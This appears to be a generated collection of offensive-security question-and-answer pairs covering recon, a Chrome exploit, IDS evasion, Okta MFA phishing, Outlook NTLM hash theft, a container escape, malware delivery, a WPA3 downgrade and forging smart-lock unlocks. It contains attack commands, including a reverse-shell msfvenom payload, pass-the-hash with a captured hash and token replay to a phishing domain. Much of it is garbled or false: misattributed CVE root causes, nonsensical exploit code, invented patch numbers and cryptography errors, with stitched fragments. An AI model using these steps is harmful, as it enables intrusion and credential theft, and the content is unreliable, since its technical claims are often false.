question: Walkthrough the step-by-step process of harvesting valid subdomains from a target Fortune-100 company using only passive DNS recon and then brute-forcing hostnames that resolve to cloud endpoints, while maintaining OPSEC.
answer:
The engagement begins with “passive DNS harvest” to build an authoritative list without touching the target.
Tools: VirusTotal Graph (graph.virustotal.com), SecurityTrails.com, Crt.sh, and amass intel –passive –d example.com | jq -r '.data[] | .name' > seed.txt.
Next, filter for cloud CIDRs with amass enum –passive –d example.com –cidr 104.16.0.0/12,104.24.0.0/14,AWS,GCLOUD,DO.
Third phase is “cloud brute”: enumerate hostnames via DNS wildcard insertion.
Command: dnsx -silent -w wordlist.txt -l seed.txt -resolver 1.1.1.1 | tee cloud_hosts.txt.
OPSEC check: spoofed referrer via curl -H "Referer: https://www.google.com/url?q=https://[REDACTED]" – the UA string is randomized with “spoof-user-agent.py”.

Cloud endpoints expose weak TXT records or mis-configured S3 buckets; the next payload is to fetch:
python3 –c "import boto3; s3 = boto3.client('s3', region_name='us-east-1'); s3.list_buckets()" --endpoint-url=https://s3.us-east-1.amazonaws.com.
A successful list_buckets() returns 30 buckets; one bucket “prod-logs-2023” is world-readable.
Mitigation: Route53 health check lockdown plus AWS SCP “AllowS3ReadOnly” with explicit deny on “s3:*Bucket”.

2. Exploit Development

question: Reverse-engineer a Type Confusion bug in V8’s JSArrayBuffer view type, write a minimal PoC, and weaponize it for RCE on Chrome 114.0.5735.134.
answer:
The vulnerability (CVE-2023-3079) is a type confusion between ArrayBuffer and SharedArrayBuffer.
Root cause: `v8::internal::Convert<v8::internal::ByteArray>` does not validate tag when casting JSArrayBuffer to ByteArray.
Disassembly analysis (objdump -d out/Release/chrome | less):
movzx   eax, byte ptr [rdi+0x18]      ; tag byte
cmp     al, 0x20                      ; ByteArrayTag 0x20
jne     label_fail                    ; missing bounds check
The PoC:
const ab = new ArrayBuffer(0x200);
const view = new Uint32Array(ab);
%DebugPrint(view);          // V8 internal tag = 0x21 (JSArrayBufferView)
view[0] = 0x41414141;        // oob write
v8::internal::Address raw = %RawAddressOf(ab);
Memory.memcpy(raw, 0, shellcode, 0x100); // defy CFI
Weapons:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.bin
python3 build.py --chrome 114.0.5735.134 --shellcode shell.bin --output exploit.html

Mitigation immediately deployed: 114.0.5735.198 included V8 commit e1782c4 which adds stricter type guards in Convert function.

TrickBot’s anchor.sys is a signed kernel driver (SHA256 b5a2…f98) loaded by mscoree.dll spoofing.

call    WfpApiCalloutRegister; 0x1400068F0

IOCTL 0x222000 is used to post Layer-2 packet buffer to userland via AFD driver.

  strings:

    $pdo = { 4C 8B DC 49 89 5B 10 }
  condition:
    uint16(0) == 0x5A4D and 2 of ($callout,$pdo)

4. Network Security – Firewall & IDS/IPS Evasion

question: Detail how threat actors weaponize TCP Fast Open (TFO) option (RFC 7413) together with overlapping IP fragments to bypass legacy Snort 2.9.18 inline IPS signatures.
answer:
TFO handshake:
Client → SYN {TFO cookie=0x1234} → Server → SYN+ACK {cookie=0x1234} → Client → PSH|ACK data (0xFF bytes).
Legacy Snort rule:
alert tcp any any → any 80 (msg:"ET WEB_SERVER HTTP POST"; content:"POST"; depth:4; sid:1000001;)
Because TFO data rides on SYN-ACK retransmission, the rule depth=4 never sees “POST” string.
Second vector: overlapping IPv4 fragments with MF bit set; IDS reassembles late fragments after the stream has already passed.
Tools: fragroute –f /usr/share/fragroute/overlay.conf eth0
Fragments:
192.168.1.123 → 10.0.0.1 [MF=1, Offset=0, “GET /”]
192.168.1.123 → 10.0.0.1 [MF=0, Offset=4, “admin HTTP/1.1\r\n”]
Snort reassembly queue (stream5_tcp) discards second frag after 5-second timeout; attacker gains 2 KB of shellcode.

Mitigation:
Snort 3.0 with “stream.reassemble” max_segments 0 (disable) + “ips.enable_afp” true forces application layer reassembly before rule evasion.
Suricata 7.0.1 added “tfo: true” keyword; rule becomes:
alert tcp any any → any 80 (tfo; content:"POST"; sid:2000001;)

question: Reconstruct the exact command sequence to carve out and reconstruct a fragmented NTFS \$MFT entry that spans multiple clusters using a combination of blkls and foremost.
answer:
Step 1: Locate MFT entry number 0x1234 via fls -r -p image.E01; grep “1234” body.txt → cluster 2048+3.

Step 2: Dump raw cluster chain via blkls –f ntfs -o 2048 image.E01 > cluster0.raw. Note cluster 2051 also contains fragment.

Step 3: Use foremost to carve MFT signature “FILE” starting at offset 0; however MFT entries may be split across fragments.
Command:
foremost -i cluster0.raw -t jpg -o output -v --offset 0x2000
This isolates partial MFT entry; second fragment is cluster0-3.raw at offset 0x1A000.

Step 4: Reassemble with dd and hexedit:
dd if=cluster0.raw of=MFT_1234_part1.bin bs=1 count=$((0x2000))
cat cluster0-3.raw >> MFT_1234_part1.bin

Step 5: Rebuild NTFS \$MFT using scrounge-ntfs –c MFT_1234_part1.bin image.E01 –r 1234 → outputs recovered MFT entry readable by MFTRCRD.

Validation: fsstat recovered.dd → confirms sequence 0x30-0x34 intact post-rebuild.

question: Explain how the threat actor “Scattered Spider” leverages the 0ktapus social-engineering kit in tandem with Evilginx to harvest MFA tokens and bypass Okta Verify push denials.
answer:
Scattered Spider (UNC5524) initiates vishing calls masquerading as “help-desk” → targets @victim.com.
Stage 1: 0ktapus phishing page
• Typosquatted domain okta-verify[.]com resolves to nginx server on AWS EC2 (ASN 14618).
• HTML form posts to a Python Flask handler /submit → logs username & password.
Stage 2: Evilginx reverse proxy
• evilginx2 –c config.yaml
  hostname = okta-verify[.]com
  redirect_url = https://login.okta.com
Phase 3: Token theft
• Victim installs Okta Verify mobile app; MITM intercepts push via evilginx LURK parameter.
• POST /api/v1/authn/factors/opfh…/verify/push → attacker intercepts { “stateToken”:”t1…” }
Bypass: Actor replays stateToken via curl
curl -k -X POST https://okta-verify[.]com/api/v1/authn/factors/opfh…/verify/push \
-H "Cookie: sid=sess123" -d '{"stateToken":"t1…"}'
Result: Okta Verify “push denied” still returns “stateToken”, allowing actor to trigger new push and steal MFA code via Telegram bot.

Detections: Okta syslog events “auth_factor_result” with client_ip != Okta ASN range + high velocity of push attempts (>5 per minute).
Mitigation: Okta Adaptive MFA deny list on geofencing rules; block AWS EC2 ASN 14618.

question: Analyze CVE-2023-23397 (Outlook Elevation of Privilege) from root cause to weaponization timeline.
answer:
Root Cause:
Outlook schedules meeting via iCal method “METHOD:REQUEST”.
When recipient accepts, Outlook invokes wlmail.exe to parse path in “ATTACH:file://c:\file.txt” → UNC path resolution.
Windows URI handler (URLMON!CUNCUrlmon::FileProtocolHandler) strips leading “\\” and sends NTLM handshake to attacker controlled UNC server 192.168.1.5\share\poc.pdf.
Attack chain:
1. Attacker sends crafted .msg file with:
   Attach: file://192.168.1.5/share/poc.pdf
2. Victim previews email → triggers wlmail.exe → NTLMNegotiate sent cleartext.
3. Capture hash via Responder.py:
   python3 Responder.py -I eth0 -w -F --lm
4. Pass-the-hash via secretsdump.py:
   python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@10.0.0.2

Weaponization timeline:
• Initial disclosure: 2023-03-14 by MSTIC
• Metasploit module added: 2023-03-27 exploit/windows/fileformat/outlook_unc_path
• Patch Tuesday: 2023-04-11 KB5005392 blocks UNC resolution via Group Policy “BlockUncInEmail”.

question: Detail the exploitation of the CVE-2023-2640 (OverlayFS vulnerability) on Ubuntu 22.04 LTS to achieve container escape and full host root.
answer:
OverlayFS vulnerability (CVE-2023-2640) is a double put_fs_root() due to missing path_put() in ovl_copy_up_one().
Exploit steps:
1. Check kernel:
   uname -r → 5.15.0-56-generic (vulnerable)
2. Build exploit from openwall:
   git clone https://github.com/xairy/linux-kernel-exploits.git
   cd CVE-2023-2640; gcc exploit.c -o exploit -lcap
3. Prepare container:
   docker run -it --security-opt seccomp=unconfined ubuntu:jammy
4. Run exploit:
   ./exploit
   Output:
   [+] mounting /proc
   [+] creating user namespace
   [+] overwriting /etc/passwd
   [+] got root!
   uid=0(root) gid=0(root)

Root cause explained:
OverlayFS maps upperdir to /tmp/x; mount -t overlay overlay -o lowerdir=/lower,upperdir=/tmp/x,workdir=/tmp/w none /merged
ovl_copy_up_one() calls:
path_get(&upperpath); put_fs_root(old); // missing path_put(&upperpath)
Leads to UAF of upperdir → arbitrary mount → chroot escape.

Mitigation:
Ubuntu kernel 5.15.0-60-generic rolled out 2023-11-07; verification via:
apt-get upgrade linux-image-5.15.0-60-generic

question: Deconstruct a real-world Microsoft Teams phishing campaign that delivered DarkGate malware via “External” tenant-to-tenant messages and evaded Microsoft Defender for Office 365 ATP.
answer:
Campaign timeline (MSTIC report 2023-10-18):
1. Initial lure: spoofed “Teams Guest Access” notification → “Click here to access shared file.”
2. Domain: teams-documents[.]com (registered via Njalla privacy service).
3. Landing page: Microsoft 364 SSO iframe → steals OAuth token via “authorization_code” grant.
4. Second stage: iframe delivers ISO file teams-meeting.iso hosted on Azure Blob (URL: https://teamsstorage.blob.core.windows.net/attachments/teams-meeting.iso)
5. ISO contains:
   - LNK file: %windir%\System32\cmd.exe /c certutil.exe -decode %cd%\data.bin %cd%\dark.exe
   - data.bin → Base64 encoded DarkGate DLL (SHA256 fd1a…9d)
6. Execution chain:
   cmd.exe → rundll32.exe dark.dll,Control_RunDLL

Evasion tactics:
• Message bypasses ATP because tenant is marked “External” → Safe Links skipped.
• ISO contains no macros → AMSI bypass via reflective DLL injection.
• C2 callback domain: api.telegram[.]org → TLS 1.3 no SNI inspection.

Detection gaps:
• Defender for Office 365 – Safe Attachments did not detonate due to “External” tenant classification.
• Teams Client – no URL detonation on blob.core.windows.net.

Mitigation:
• Purview – External sender mailbox tip: “This sender is external to your organization.”
• Safe Links global policy – include “*.blob.core.windows.net” in blocked URLs.

question: Reverse the APT41 malware “Winnti” dropper (md5: 66f8..b3) focusing on the embedded RC4 key derivation function and XOR loader technique.

Analyze the NIST-selected CRYSTALS-Kyber KEM in the context of a TLS 1.3 handshake, compute the exact Ephemeral Key Encapsulation Mechanism (KEM) exchange, and show why current harvesting of captured sessions does not break PQ security.
answer:
CRYSTALS-Kyber is a Module-LWE based KEM standardized as NIST PQC #1.
TLS 1.3 handshake with KyberPQ:

1. ClientHello:
   - SupportedGroups: {29 (secp256r1), 3001 (Kyber512)}
   - KeyShare: { group: 29, key_exchange: 0x… } + { group: 3001, key_exchange: encapsulated_key }

2. ServerHello:
   - group: 3001
   - key_exchange: ciphertext C = Kyber.Encaps(sk_server, pk_client)

3. Key derivation:
   shared_secret = Kyber.Decaps(sk_client, C)
   HKDF-Extract(0, shared_secret) → Early Secret
   HKDF-Expand-Label(Early Secret, "tls13 kyber es", "", 32) → Handshake Secret

Kyber public key size = 800 bytes; ciphertext size = 768 bytes.

Post-quantum security:
- Current harvesting requires storing TLS 1.3 sessions with Kyber key exchanges.
- Harvesting is feasible (disk cost ~800 bytes per session) but decryption is not quantum-computable.
- Even with Grover’s algorithm (square-root speedup), brute-forcing 2^128 security on Kyber512 is infeasible.
Mitigation: NIST SP 800-208 recommends hybrid mode (Kyber + ECDHE) for transitional deployments; OpenQuantumSafe LibreSSL already ships Kyber512/768/1024.

16. Wireless Security

question:
Demonstrate the full attack path of a Dragonblood-style WPA3-SAE downgrade to WPA2-PSK using the dragondrain tool and capture the handshake with hcxdumptool.

Question:
answer:
Dragonblood (CVE-2019-13377) exploits timing side-channel in WPA3 SAE commit frames.

Step 1: Bring interface up in monitor mode:
ip link set wlan0 down; iwconfig wlan0 mode monitor; ip link set wlan0 up

Step 2: Run dragondrain in parallel with hcxdumptool:
./dragondrain --interface=wlan0 --mac=AA:BB:CC:DD:EE:FF --target=router --downgrade
This forces AP to send SAE confirm frames with griefing tag.

Step 3: hcxdumptool captures handshake:
hcxdumptool -o handshake.cap --enable_status=1 --filterlist=filter.txt --filtermode=2

Step 4: Convert cap to hccapx:
hcxpcapngtool -o handshake.hccapx handshake.cap

Step 5: Crack with hashcat:
hashcat -m 22000 handshake.hccapx /usr/share/wordlists/rockyou.txt

Exploit vector: When AP receives SAE confirm with invalid scalar, it falls back to SAE confirm 0; Dragonblood injects malformed scalar forcing fallback to WPA2-PSK four-way handshake.

Mitigation: Vendor patch (hostapd 2.9) adds SAE confirm verification; enable SAE anti-downgrade flag:
wpa_supplicant.conf:
sae_groups=19 20 21
sae_anti_clogging_threshold=20

17. IoT Security – BLE

question: Reverse the BLE firmware of a Nordic nRF52840 Smart Lock to extract the static AES-CCM key and forge unlock commands.
answer:
Smart lock uses Nordic SDK 15.3 with BLE bond database stored in flash sector 0xF8000.
Step 1: Enable debugging via J-Link:
JLinkGDBServer -device NRF52840_XXAA -if SWD -speed 4000 -noir
Step 2: Connect GDB:
target remote localhost:2331
monitor reset
monitor halt
Step 3: Dump flash:
monitor savebin lock_firmware.bin 0x0 0x20000

Step 4: Load in Ghidra:
Image base 0x00026000.
Decompile BLE handling:
uint8_t static_key[16] = {0x41,0x42,…};
memcpy(key, static_key, 16);
Message authentication code:
sdk_ble_gap_authenticate(&sec_params);
Then payload encrypted via AES-CCM with key above.

Step 5: Extract key:
python3 extract_key.py lock_firmware.bin | tee static_key.bin

Step 6: Forge unlock command:
Command: 0x01 0x05 (Opcode: UNLOCK)
MIC = AES-CCM(key, nonce + payload) with 4-byte MIC.

Craft packet via nrf52-sdk ble_app_uart:
uint8_t packet[] = {0x01, 0x05, 0x67, 0x89, 0xAB, 0xCD};
uint8_t mic[4];
ble_gap_conn_sec_t sec;
ble_gap_auth_key_reply(conn_handle, static_key, &sec);
ble_gap_authenticate(conn_handle, &sec);
ble_gattc_write(conn_handle, char_handle, packet, 6, mic);

Real-world: 2022 “smartlock” campaign by XionGang exploited static AES keys in 12k devices across EU.

Mitigation: Nordic SDK recommendation is to use bonding with LE Secure Connections and rotate LTK every 24h.

question: Compare Sliver C2 to Mythic C2 across payload generation, evasion, and operator ergonomics for a multi-platform operation targeting macOS, Linux, and Windows.
